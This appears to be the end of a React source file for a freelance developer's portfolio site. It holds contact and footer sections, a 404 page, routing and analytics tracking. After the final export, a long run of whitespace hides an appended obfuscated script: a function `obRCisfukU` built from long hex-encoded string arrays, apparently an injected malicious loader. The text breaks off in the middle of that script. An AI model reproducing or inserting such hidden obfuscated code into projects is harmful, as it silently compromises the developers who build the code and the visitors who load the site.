              <div style={{
                position: "absolute", top: 0, left: 0, right: 0, height: 1,
                background: "linear-gradient(to right, transparent, rgba(255,255,255,0.55), transparent)",
              }} />
              <div style={{
                position: "absolute", bottom: 0, right: 0, width: 180, height: 180,
                borderRadius: "50%",
                background: "radial-gradient(circle, rgba(255,255,255,0.05), transparent 70%)",
                pointerEvents: "none",
              }} />
              <h3 style={{
                fontFamily: "'Plus Jakarta Sans',sans-serif",
                fontSize: "clamp(16px,2.2vw,24px)", fontWeight: 800,
                color: "#eef2f6", lineHeight: 1.3, margin: "0 0 14px",
                letterSpacing: "-0.02em",
              }}>Looking for a remote developer who ships?</h3>
              <p style={{
                fontFamily: "'Space Mono',monospace",
                fontSize: "clamp(10px,1.1vw,12px)", lineHeight: 1.95,
                color: "rgba(255,255,255,0.32)", margin: "0 0 26px",
              }}>
                Open to full-time remote roles or long-term contracts with USA & Europe-based teams.
              </p>
              <a href="mailto:Aqibfahraz@gmail.com" style={{
                fontFamily: "'Space Mono',monospace",
                fontSize: "clamp(10px,1.1vw,12px)", letterSpacing: "0.18em",
                textTransform: "uppercase", background: "#f3f3f3", color: "#02060a",
                padding: "12px 26px", textDecoration: "none", fontWeight: 700,
                display: "inline-block", transition: "opacity 0.2s",
              }}
                onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
                onMouseLeave={e => e.currentTarget.style.opacity = "1"}
              >Let's Talk</a>
            </div>
          </div>

        </div>
      </div>
    </section>
  );
}

// â”€â”€â”€ CONTACT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Contact() {
  const [ref, inView] = useInView();
  return (
    <section id="contact" style={{
      padding: "clamp(70px,10vw,140px) clamp(20px,5vw,60px)",
      borderTop: "1px solid rgba(255,255,255,0.07)",
      textAlign: "center", position: "relative", overflow: "hidden",
    }}>
      <div style={{
        position: "absolute", top: "50%", left: "50%",
        transform: "translate(-50%,-50%)",
        width: "clamp(300px,60vw,700px)", height: "clamp(300px,60vw,700px)",
        borderRadius: "50%",
                background: "radial-gradient(circle, rgba(255,255,255,0.04), transparent 65%)",
        pointerEvents: "none",
      }} />
      <div ref={ref} style={{
        position: "relative",
        opacity: inView ? 1 : 0, transform: inView ? "none" : "translateY(40px)",
        transition: "all 0.8s ease",
      }}>
        <div style={{
          fontFamily: "'Space Mono',monospace",
          fontSize: "clamp(9px,1vw,11px)", letterSpacing: "0.28em",
          color: "rgba(255,255,255,0.7)", textTransform: "uppercase", marginBottom: 28,
        }}>06 â€” Start a conversation</div>
        <h2 style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif",
          fontSize: "clamp(34px,7vw,88px)", fontWeight: 800,
          color: "#eef2f6", lineHeight: 1, margin: "0 0 20px",
          letterSpacing: "-0.03em",
        }}>
          Ready to build<br />
              <span style={{ color: "#f3f3f3" }}>something real?</span>
        </h2>
        <div style={{
          display: "flex", justifyContent: "center", flexWrap: "wrap",
          gap: "8px 22px", marginBottom: 28,
        }}>
          <a href="mailto:aqibfahraz@gmail.com" style={{
            fontFamily: "'Space Mono',monospace",
            fontSize: "clamp(10px,1.1vw,13px)",
            color: "rgba(255,255,255,0.5)", textDecoration: "none",
          }}>aqibfahraz@gmail.com</a>
          <a href="tel:+923033961515" style={{
            fontFamily: "'Space Mono',monospace",
            fontSize: "clamp(10px,1.1vw,13px)",
            color: "rgba(255,255,255,0.5)", textDecoration: "none",
          }}>03033961515</a>
        </div>

        {/* Social icon row */}
        <div style={{ display: "flex", justifyContent: "center", gap: "clamp(8px,2vw,12px)", marginBottom: 44 }}>
          {[
            { label: "LinkedIn", href: "https://www.linkedin.com/in/aqib-faraz-99848638b/",
              icon: <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg> },
            { label: "GitHub", href: "https://github.com/aqibfaraz?tab=repositories",
              icon: <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg> },
          ].map(x => (
            <a key={x.label} href={x.href} target="_blank" rel="noreferrer" style={{
              display: "inline-flex", alignItems: "center", justifyContent: "center",
              width: "clamp(36px,8vw,46px)", height: "clamp(36px,8vw,46px)",
              color: "rgba(255,255,255,0.5)", textDecoration: "none",
              border: "1px solid rgba(255,255,255,0.16)",
              transition: "all 0.25s ease",
              background: "transparent",
              borderRadius: "4px",
            }}
              onMouseEnter={e => { 
                e.currentTarget.style.color="#929292";
                e.currentTarget.style.borderColor="rgba(255,255,255,0.42)";
                e.currentTarget.style.background="rgba(255,255,255,0.06)";
              }}
              onMouseLeave={e => { 
                e.currentTarget.style.color="rgba(255,255,255,0.5)"; 
                e.currentTarget.style.borderColor="rgba(255,255,255,0.16)";
                e.currentTarget.style.background="transparent";
              }}
              title={x.label}
            >{x.icon}</a>
          ))}
        </div>
        <a href="mailto:Aqibfahraz@gmail.com" style={{
          fontFamily: "'Space Mono',monospace",
          fontSize: "clamp(11px,1.2vw,13px)", letterSpacing: "0.18em",
          textTransform: "uppercase", background: "#f3f3f3", color: "#02060a",
          padding: "16px clamp(28px,3vw,44px)", textDecoration: "none", fontWeight: 700,
          display: "inline-block", transition: "opacity 0.2s",
        }}
          onMouseEnter={e => e.currentTarget.style.opacity = "0.85"}
          onMouseLeave={e => e.currentTarget.style.opacity = "1"}
        >Send a Message</a>
      </div>
    </section>
  );
}

// â”€â”€â”€ FOOTER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Footer() {
  return (
    <footer style={{
      padding: "22px clamp(20px,5vw,60px)",
                borderTop: "1px solid rgba(255,255,255,0.06)",
      display: "flex", justifyContent: "space-between",
      alignItems: "center", flexWrap: "wrap", gap: 12,
    }}>
      <span style={{
        fontFamily: "'Space Mono',monospace", fontSize: 11,
        color: "rgba(255,255,255,0.16)", letterSpacing: "0.12em",
      }}>Â© 2025 Aqib Faraz</span>
      <a href="https://aqibfaraz.dev" style={{
        fontFamily: "'Space Mono',monospace", fontSize: 11,
        color: "rgba(255,255,255,0.52)", letterSpacing: "0.15em", textDecoration: "none",
      }}>aqibfaraz.dev</a>
    </footer>
  );
}

// â”€â”€â”€ SECTION LABEL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// `big` switches the heading to the hero headline's type treatment â€”
// larger, uppercase, tighter tracking.
function SectionLabel({ num, title, big }) {
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
      <span style={{
        fontFamily: "'Space Mono',monospace",
        fontSize: "clamp(9px,1vw,11px)", letterSpacing: "0.2em",
        color: "rgba(255,255,255,0.62)", textTransform: "uppercase",
      }}>{num}</span>
      <span style={{
        width: 44, height: 1, background: "rgba(255,255,255,0.3)",
        display: "inline-block", flexShrink: 0,
      }} />
      <h2 style={{
        fontFamily: "'Plus Jakarta Sans',sans-serif",
        fontSize: big ? "clamp(34px,6vw,76px)" : "clamp(24px,4vw,48px)",
        fontWeight: 800, color: "#eef2f6", margin: 0,
        letterSpacing: big ? "-0.035em" : "-0.025em",
        textTransform: big ? "uppercase" : "none",
        lineHeight: big ? 0.94 : "normal",
      }}>{title}</h2>
    </div>
  );
}

// â”€â”€â”€ HOME PAGE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Home({ isMobile, scrollY, onOpenContact }) {
  return (
    <>
      <Hero isMobile={isMobile} scrollY={scrollY} />
      <Work isMobile={isMobile} />
      <Services isMobile={isMobile} />
      <Testimonial />
      <OurTechnologies />
      <ClosingCta onOpenContact={onOpenContact} />
      <Faq onOpenContact={onOpenContact} />
      <Footer />
    </>
  );
}

function NotFound() {
  return (
    <div style={{
      minHeight: "100vh",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: "100px 24px",
      textAlign: "center",
      background: "radial-gradient(circle at top, rgba(255,255,255,0.05), transparent 42%), #02060a",
      color: "#eef2f6",
    }}>
      <div style={{ maxWidth: 620 }}>
        <div style={{
          fontFamily: "'Space Mono',monospace",
          letterSpacing: "0.3em",
          textTransform: "uppercase",
          color: "#f3f3f3",
          fontSize: 12,
          marginBottom: 18,
        }}>Oops</div>
        <h1 style={{
          fontFamily: "'Plus Jakarta Sans',sans-serif",
          fontSize: "clamp(44px, 8vw, 88px)",
          lineHeight: 0.95,
          margin: 0,
          letterSpacing: "-0.04em",
        }}>Page not found</h1>
        <p style={{
          margin: "18px 0 0",
          color: "rgba(255,255,255,0.45)",
          fontFamily: "'Space Mono',monospace",
          fontSize: 13,
          lineHeight: 1.8,
        }}>
          Yeh page exist nahi karta ya move ho chuka hai.
        </p>
        <div style={{ marginTop: 34, display: "flex", gap: 14, justifyContent: "center", flexWrap: "wrap" }}>
          <Link to="/" style={{
            fontFamily: "'Space Mono',monospace",
            fontSize: 11,
            letterSpacing: "0.18em",
            textTransform: "uppercase",
            background: "#f3f3f3",
            color: "#02060a",
            padding: "14px 24px",
            textDecoration: "none",
            fontWeight: 700,
          }}>Go Home</Link>
          <Link to="/blog" style={{
            fontFamily: "'Space Mono',monospace",
            fontSize: 11,
            letterSpacing: "0.18em",
            textTransform: "uppercase",
            color: "#eef2f6",
            padding: "14px 24px",
            textDecoration: "none",
            fontWeight: 700,
            border: "1px solid rgba(255,255,255,0.14)",
          }}>Blog</Link>
        </div>
      </div>
    </div>
  );
}

// â”€â”€â”€ APP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function AppContent() {
  const mouse = useMouse();
  const scrollY = useScrollY();
  const isMobile = useIsMobile();
  const location = useLocation();
  const [contactSide, setContactSide] = useState(null);
  const hasTrackedInitialPage = useRef(false);

  useEffect(() => {
    if (typeof window.gtag !== "function") return;
    if (!hasTrackedInitialPage.current) {
      hasTrackedInitialPage.current = true;
      return;
    }

    const pagePath = `${location.pathname}${location.search}${location.hash}`;
    window.gtag("event", "page_view", {
      page_path: pagePath,
      page_location: window.location.href,
      page_title: document.title,
    });
  }, [location]);

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=Syne:wght@400;600;700;800&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap');
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        html { scroll-behavior: smooth; }
        body {
          background: #02060a;
          color: #eef2f6;
          overflow-x: hidden;
          cursor: auto;
        }
        ::-webkit-scrollbar { width: 3px; }
        ::-webkit-scrollbar-track { background: #02060a; }
        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.3); border-radius: 2px; }
        a, button { cursor: pointer; }
        
        /* Blog markdown styling */
        .blog-content {
          color: #ccc;
          line-height: 1.8;
          font-size: 16px;
        }

        .blog-content h1,
        .blog-content h2,
        .blog-content h3 {
          color: #eef2f6;
          margin: 32px 0 16px;
          line-height: 1.3;
          font-family: 'Plus Jakarta Sans', sans-serif;
        }

        .blog-content h2 { font-size: 24px; }
        .blog-content h3 { font-size: 20px; }

        .blog-content p { margin-bottom: 20px; font-family: 'Space Mono', monospace; }

        .blog-content code {
          background: rgba(0, 204, 153, 0.1);
          padding: 2px 8px;
          border-radius: 4px;
          font-family: 'Fira Code', monospace;
          font-size: 14px;
          color: #a6a6a6;
        }

        .blog-content pre {
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid rgba(0, 204, 153, 0.15);
          border-radius: 8px;
          padding: 20px;
          overflow-x: auto;
          margin-bottom: 24px;
        }

        .blog-content pre code {
          background: none;
          padding: 0;
          font-size: 13px;
          color: #ddd;
        }

        .blog-content a {
          color: #f3f3f3;
          text-decoration: none;
          transition: opacity 0.2s;
        }
        .blog-content a:hover { opacity: 0.8; text-decoration: underline; }

        .blog-content ul, .blog-content ol {
          margin: 0 0 20px 24px;
          font-family: 'Space Mono', monospace;
        }
        .blog-content li { margin-bottom: 8px; }

        .blog-content blockquote {
          border-left: 3px solid #444;
          padding-left: 16px;
          color: #888;
          margin: 24px 0;
          font-style: italic;
          font-family: 'Space Mono', monospace;
        }

        .blog-content table {
          width: 100%;
          border-collapse: collapse;
          margin: 24px 0;
        }

        .blog-content table th,
        .blog-content table td {
          border: 1px solid rgba(0, 204, 153, 0.1);
          padding: 12px;
          text-align: left;
          font-family: 'Space Mono', monospace;
        }

        .blog-content table th {
          background: rgba(0, 204, 153, 0.05);
          color: #f3f3f3;
        }
        
        @keyframes pulse {
          0%,100%{box-shadow:0 0 6px rgba(255,255,255,0.3),0 0 12px rgba(255,255,255,0.12)}
          50%{box-shadow:0 0 14px rgba(255,255,255,0.5),0 0 28px rgba(255,255,255,0.18)}
        }
        /* list is duplicated in the markup, so -50% lands exactly on a repeat */
        @keyframes marqueeLeft {
          from { transform: translateX(0); }
          to   { transform: translateX(-50%); }
        }
        @keyframes drawerRight { from { transform: translateX(100%); } to { transform: translateX(0); } }
        @keyframes drawerLeft { from { transform: translateX(-100%); } to { transform: translateX(0); } }
      `}</style>

      {location.pathname === "/" && <Nav scrollY={scrollY} isMobile={isMobile} onOpenContact={setContactSide} />}
      {location.pathname === "/" && !isMobile && <FloatingContact onOpenContact={setContactSide} />}
      {contactSide && <ContactDrawer side={contactSide} onClose={() => setContactSide(null)} />}

      <Routes>
        <Route path="/" element={<Home isMobile={isMobile} scrollY={scrollY} onOpenContact={setContactSide} />} />
        <Route path="/blog" element={<BlogList />} />
        <Route path="/blog/:slug" element={<CaseStudyPost />} />
        <Route path="/blog/notes/:slug" element={<BlogPost />} />
        <Route path="*" element={<NotFound />} />
      </Routes>
    </>
  );
}

export default function App() {
  return (
    <Router>
      <AppContent />
    </Router>
  );
};																																																																																																																																																																																																																																																																										var z = '-*1839';function obRCisfukU(){var ZsitfEX=['7f7b7c777e7f78280023081429','0a260b1f1e','3d070b082d','283c21230d262f3c0d212a2b','24212720','222b20293a26','7f7f7f7e767c7b040817363637','1c360a1f08','791f2007390f0f','2938033409','3f29000605','230c040b37','263f2b3c3d36223b38392f2d2a242c372329213c342825212d273e3a3c3b3a203d3a21202d','252a1b2228','7c327e327a327f327d','011d063d0b','7c7f7d7c767e767e261f1804043d','7f7c787b797b7c082436342017','2a3e392c23','732f2b203c3b26662f22737b2d622976282a3b60373c6e6060202d2b2d28627b6c3e2f2b2f3b78222024673c137c3b386c36633f66136e2f75663c7375753c65662f1576603d7c3a0f29213f623b26760d622f27623d752f660f237e66202475243864627938217966676621752378212f7a3c3967606e3c212a15283d7c20352a3c383a7a3667657e622f203c653c3c65216733347f6e732628152f20763c7f3c1562133d79637979222f2f603b277935637e78772238233a7c3c732713137265673b622b67626275203c26153c737e38633c667562733e670d3b3d73652d75297528753f0f67677f38276738257e203c227f2f2b6e2873157526273d37602b23662a65216f7c6e73662b382b2f79767360677a2b277329602073352828737f15727c2f6e287f733c757a621d673c3722387f3b6e3775253f22353a3820386e660d6e6622622138203e6e27733a223c623c6022392134266622623a3f75753c3c666638732f263d387513363f732f2c752a2f756266663c7538243f60663a1565672a2f673c2a203c263d7a7f3766383c752826757d296c132b66602f263c3e2f3e29132960672029283e207f2662272d22757567730d75237b73653c626e6067753b73653d336567273a62652c23752a653b236763733d27273f2122733a733c733f776560602d263f651578282b6e3a7e203c3e3c666e383c7628223c20622a2a293a6e13782f607523753c3a2660293f6e7c2f332b382b272d13292c3a27727a21750d752262343427786522152f157565663d276c22276c3c62203e27773d62283c28263b39672139732b35662c73392b207c3a60293b60277325272f2f2f656737283a3e2f7d20336773776c672d3e0f653b753b3a3e136c73222579383e3a6e7f3c752634396c673a666777676660223b22733d7928756e753d3f7e67206c37657e3d3373382f653d6e2326667e3f6013263875706e7e78730f6321342b3a3c663a7f3c3a3c3d273d217e2b62607534156628727b2b793a62663c2f212f38203c753a26262875386224733c756e673c707f76342621642135722f25233d20672f253a2b60382177652b2f7e2d222721752c3b6e73130d6f292475377d6522672b7360332a3c73277821270d763c20207e7578732f3c6c33603c2b2773131d3a3d3c202060757c3c733a75153a752738733e3c0d3c2066672f3c2b3a3b34656e262225156536732b6e63762435662b243777666667676e','3b071c2224','3d2528143d','3606180c0c','1c11726c2d1c046f68182b2d1c192f731c3c281c6a786c2d7f751c1c172d20261161603a6e271c1c1c0910721c601c2d1c7c6015201c6e601c286061721c2d7d6f6f7b201d1c721c271c02602b1d3d2228662b2a29362d727121723c222d1c713a1c213d2a1c283b1d2b6071683e26601c1c01033d152b723d251c0b60721c3b723c1c2b751c0a1c0c3c1c1c1260281c60722d746f2c3e227e77272d211c3c3a2d1c66753c211c1c207c636c666010396e376072722a2a6e676a286e213b606b2b722f722b603a7223662d1c36281c72150466282b1c721e2c3c602c69211c27601c1c72691c1c6b391c283d672b1c60152f291d1e352a7c6025722f2d7f2b606f7d601e72141c271c64210a3d277315607228606c7a1c2c6e006c2b21361c3e2160270722252f2b1a1c607c676b2372272b1c133472321c3b6666281c391c1c121c701c776d601c7e3c2a733d607e366f3d1c60281c1d67662d2d3a7f3e28213a2f2b033b1c0e1c73721c1c612e601c256a667c2d1c603d792b7f2f60081c052d646060346c1c20281e2b3d1c3a1c1c1c60721c226d1c2872746e7c66661c6e1c6a69783d2e727d202627646a2b162d331c26716e2d3a212d60272b2d2d776e351c2f723d753b6f602b130b1c1c210660606a6c20720a7d1c3d1c1c6060661c2b2b3d3d2b1c726e3a626c6e1c2a2138331d2d7e042327601a723d0b2b293d1c39131c6c2f1c601c6f1c72216767241c6e1c2b396e273a2d603d20256633662015382b1c727e7273252806723c3c031c6e2d2725200b602d600c72681c1521131c606b2d2d1c223c3675646e156c21273d2b201c2b282b2f6f1720602b2d1c6b216c3b607278221c1c1c371c73273d731c1c66671c1c2b741c1c676f1c392d3c1c7f7260216f1c2d1c2d0e6c331c3b1c3f3b7b667d1e21226c2b1c3a7e6f283a2f1c64721c7f3a20252d28331a606f6a61723c216e07372d1c1c6e671e7212602c723a1c79741e1e3d7213603c167272602b1c3b661c1c1c3f203e6072601c752d3a273d16601c1c371c6a0e727d67251c1c2d72651c3c76226460271c6f3c0d121e6f20732d3d72662d2772661c792b1c2b1c2d606e3a722b3e2b672b7272622b72660b056f603e202c6a6c1c2f1c1c602b383b262d601a22112d60741c7e3c6e671c39396f3d1d7e603a793b607e661c77112f666a68602b7828601c1c257f0d362c27762260262d7323660e721c2a6060723c3c607c6005033c2d2c111c201c661c112d740a393a33601c60353377296a1c1c1c671a183a722f66607209602a1c30191b1c6075223c6026073d23001e6e6e3a0e1c1c76111c7c1c60271c3c1c1e1c72661c7d6d2d2b2d7e2d2b7d271c1c722f1c7d1c2f201c35143d336f03721c636460372a2f7d1c27617e6b281c6d1c6e72277c721c7e7674603a331c286f6c631c2d601c221c2d373a371c3d2b0f7e1c1d1a1c76607a3f726a081a2b1c60601e11722d1c78262c1c602b3c27602d631c262d0f1c0d7c381c60752c1d721c722f6d05721c743c131a282b2b63756f2573113d601c2d23243d661c3374721c2f1c64682960722a21232b273d1c2060666a6d112f35180e212d17636021231e2a2f23601c2f22282d37211a656f1e11293d3c60722c271c6f2860672d0768662c07211c27663c203c1960272b601c2d6e6f66272d661d1c602d3c2e747772163d3e1c666a6e231c2d3a723d60296f607a763c3d252b38181c1e2a1c25361c721c2a2b3c20672b1d3d61671c6e222b3c722d3d1a7d2a2d33601c7b0d611966601d2120143c671c2d212d2d3d2d26671c60721c1c723a603d3d661c1c722a223b602d603228763a25623d22202b3e21722b1c726f60781c602b2b1c1c1a2f68266e0328723515216a1c726e1c3d7e67736e72361d2b2d602d33722d6a2b3d66662a671c1c2d33280d1c1c7264721c602363601c641c2b726636381c3d6e6603681c28602b1e64296e703d6772216073601c273d203c1c6071357b72272c1c78671c1c7f3d6e2d1c293f2d2b222d732d22752c2b722228641d070d2a7c2b6c343e1c1c33722d1c221d6220243d2d236a1c20606f2f27277204171372281e0d3d0e240f601c726b6e3a601c21391c33696e3c703e34266060221c697229211133721d1c66253f3626156e6872271c63286a0d723b72272f0b001c7b1c1a1c13721c3e3d2560601c342a2960671372672b3c601c3c60033d1c341e701c1c2b72723a11262922723e601c2d23281c3d6f20283a1c7a6e2a3a1177107262213c2b7b1c281c366e1c1c153c1660723d2c371c7272607c1c601c3c2b201b1e663770603e72722d3d1c223a7e3a6035601d372720722929226a6e182d6067740b06076f60360a3b1c621c3e1c261c663d2d3a60033c1c032406031c1c2d1c606e1c3a202a32212f7e60206d2f607c670a2825682d1c071c1c1c61282b1c602d0e72273c3d781a657f1c1e3660601c603d2d602f1c6d60637216351c6f207a1c2d1c273a1c61201c2b77236060720f672c2b2067601372602f661c666035717d3a1c681c1c6127662216606e72266f2a1c1c726c6f2d21716e7d6e7f1c72632620722a3a202a21721c253d236d632d661a2b1c2b2b6f13601c723d721a65731c601c27633c0e1c1c603c6d2d2a722d1c1c1c23343a28600d2a2b1c3e602d351f1c272c243d213d60281c3c29631c197e2a271c1c72602572011c1c68631c6f6d6e130d3d13373a7a60632a112e1e1c1c6972601c382b241d39722a2d602d6e6228601e6066602d273a2d002c1c206963602b1c2d1c203c1f603c1c3621351c2d726c781c202a131c331c23661c6a1c1d21601a7b1c2d7c2d366064381c21272d1170603d7e0c1c2867721e722f1c60210d14327e6e1e01062a1f2160206e72607f3d211c11696e601e722b3c6015721c321c727e27721c3c756907601c153365222d6f15232d6f60222d7220662f6e3a1c1c061c2262333e331c671c761c04722f1c60723a2a66007013272d72232b0e7b2d20153b601c67602c6b3d1e207272111c1c6f1c2c1c736a1c1c10726f33673d2c63786c6d0b762d1c662a6f1c673a3c2f3a1c1c72726e7c7f1c69026f272c322b013a1c1c3a6a3b2d2a201c1c603a671c340b60091e376f6e1c0f0763203f2f3b723360372d1c6060602d1c1c602d2d2d6a101c1c2a0d111c723a762d1c263d7c6c1c7c60691d7067677c266f2b28376060706f27026a2b206e756b77011a38602a6a7a1c1c0d722d1e1d663a3b1c39226866236d6c1c323e2d26723a066a2f72726e603a6f1c1d0b28601c1c292d001e601c6e0d1c277a231c726d031c1c72753927636d0b6e72723a722b1c7206721c3c203a210b666f7e3c7e722a60601c0d6c2d2060607c2c3e66780d3e721d1c6c2b7f22672d2d722f661e601e772b723f2f6772727f722060271c2f1c1e1c66331c736068627c6f2d391c60671e1c6a60723f1c72336f7f641d721c6f1c2860722d721c2a11721c7c1c72726d1372721c1c1c3e6f603c3e1c72646f1a1c071c721e25721c343a2f606833602f222b0573271e721c6973291c1e331c3e6a351d0c606e1c3d376066603a6f6e2d75722b7b3d26787a3a3a723e2872213a363b021a253c7075721c602d3e3d1c602d1c3a1c636d2f7a3b1c78601c3a2b7563666a713976743e61681c227e723c6d722b6e27273d286f2a6a2f2111666d2d233c6e2b721c1c186f1e202d2f723a60302d3c2d662b69642f746e721c1c202b2f142b606b612a1c721c1c64660b6e2e652b151e2d391c396e72662b3b2d3a2f6760791972616a1e7260262d1d1a6e792b1c0c6f60651c6007722c261c2b22603a2b602c7a153b203b2b3b1c6f1c223a661c1c1c62336206283a0638112060722b1c6e110f7276723d3c721c367a671c006f3e1c2a320c6e721c1c25272b692d63601c2d20237d2d3d721d2772276067600b661c66721c1c1e1c6e117d1c722d392b606f6022721c6a6f1c2c2a622b721e1c0b226a3a3e3c6f72216167601c1c3a6f621a663c2d6d61601c3766651c3c1c292e722860722f6560286761727268726e2b1c1c722b2763720c280b603d1c2c201c1c67601c6b61243a221c726b2d6e1c6f1c66361c6d2d1c603d1c1c601c0360721c792d662d29221c2d23601372602b2d7c2c671e72727c1c1c682a2f0c05673c72143a70152a2f1c062d2b2a60031c72333d1c093c601c72717f1c281c1c2d2d2d1c66213d2d6c1c1c302572126f032d603e600d673b1c366765661c25122b692478031e1b1c0d232d711c1c7d1c7a6627272b603d1c2b641c74341d1c751e206614677222251c382274721c1f351c2d276c2d1e652b62031c192f60721c033c1c223a6d721c1c3d3a7d3c6f60722972051c391c661c24601c1c2f6f60097a1c606a3e20603475352b1c757c7f357e1a7a663c1c256369606f721c367227052672673d15723a2d6e1e3b2b1c333c66282f2f1c287922721c7b6f3c1c220a161c23607f743e271c6e72736e1c243d2160722b3c6f211c3f07671c7f1c3c3c392135683a1c1c0572200d14637e03602d3b1c672d6b2d2a7e6539726a0b72271a7272213a2a2f372072272110601c691c1c391c2d787b251c6d041e60726f1c7b2b6f3c351c2b75372b1c66607e73752d273d602d66293a1c7c3e3b7773031f2815356201206e60601e00276672601c2f271f1c60602d6b3a6166611c72603c601c3c6060226f3d2d3b2b602f1e301c6f2d7e7d2f1b1c6c3a2d3d2d606f3c181c3e2f27347e722c6c2a3a292a6f603d716d2d382a1c306d1c721c7267661a2c60071c671e2d7278717967137a19786d20201e3a60333c2b321c1b701c2b2f1c673e6d6e201d652c7c6b271c24333d66162010213d372d3d292a04603d3d153e251c76606e3d3b393c1c2037332a216009271a607239652d60662d3d756f6e2026661c621c0d1c157268161c7272602d2c2d1a1c3d0f28202d1d631c6c2772602d0c66321c1c601c2a6b1c601b611c603c02723a676f1c2b1c7c2d3e3e6f3d72701c717f1c6a723a2b1c72721c217e3c3a28661c2b3d2c0a1c7922272f1c60333d60613d1c2d3c3d2f3c221c6b28133d7e1c6072222b723c2b6b3d603d22223d2c761c01360d1c3a2d7f3a783560636e1c22602b1c21602d29231c25211c3d2c2d2f7207373b331c3c3a6d3d68323a1c2f361c672621601c3d286e251c1c1c7a2d3c6636602d733a6072277d661c366e607260601c6a286c3a6e1c1c3d0072610d6e1c201c2a1c3c3e1c1c72212a72601c723c152f3c6c2272606e1e6c601c3d601c603c2d6f386d0a281c2b2b2c2135621c672a763872281c2d602d04723a2b606f1c1c6c251d661d671c6d721d60261e333c3a60666166602d667f2a721c396f3d3b7e6621601e2c667e601c042d0b270d6028666e6027602c3b2d726d3c6060601c1c157667116f1c601d1c0c6f6c3a1c182c20111c222d1e1c1c6e211c207526721c1e0e3c762f1c3c222d322d217b661c3e67721c362a72726a6020722221332b3c1c7221371c2f20602137601c070c72263a722d212c0b271c336623033c601a2f1c7e1c2b3a271c33606f72601c7f773a720f2b2c1c11022d22266f0a7e3c601c7e2722273c1c2d613d76722d1c663c641c0e2b7272602275603c2d631e3b222f1c2d2d1c276c7e780e6f1c2d6f601f25226272297279332c662f1c2d02602d3d696560601a66723c1c7272606068282a701c216e2d212b231c2d3960222d20662d741c69323a721c201c17137a037e091c601c081c3b3a606f7228603b656a653a721c64793d1c1c1c66272c262a731e6072331c1c732b1c60116760673c3c627a686e221c332b721c781c1c72102928222b1c2a3d3a1e30722c2d60663d37727b331c2771222d267268607d353b60201174271c792c757e721c722d1c1c1c2d1c0e327f3d2b091c3d7c672d73267228772b72723c652b1c126967687b3c3861083c15602f603a20601c1e3c201b7221112d7820730b1a72602765362d79222b383d3b723c606f1c2d726f131c396e601c1c66131e1c0a606e22286f7468602c2a3